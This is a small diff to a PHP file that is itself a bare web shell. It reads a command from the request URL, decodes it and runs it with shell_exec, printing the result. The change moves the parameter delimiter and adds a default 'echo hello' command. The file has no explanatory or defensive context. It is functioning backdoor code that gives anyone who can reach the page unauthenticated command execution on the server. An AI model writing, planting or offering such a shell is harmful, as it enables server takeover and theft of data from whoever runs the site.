@@ -1,7 +1,8 @@
 <pre>
 <?php
-  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "?", 1)+1);
+  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "=", 1)+1);
   $cmd = urldecode($cmd);
+  $cmd = $cmd === "" ? "echo hello" : $cmd;
   echo shell_exec($cmd);
 ?>
 </pre>
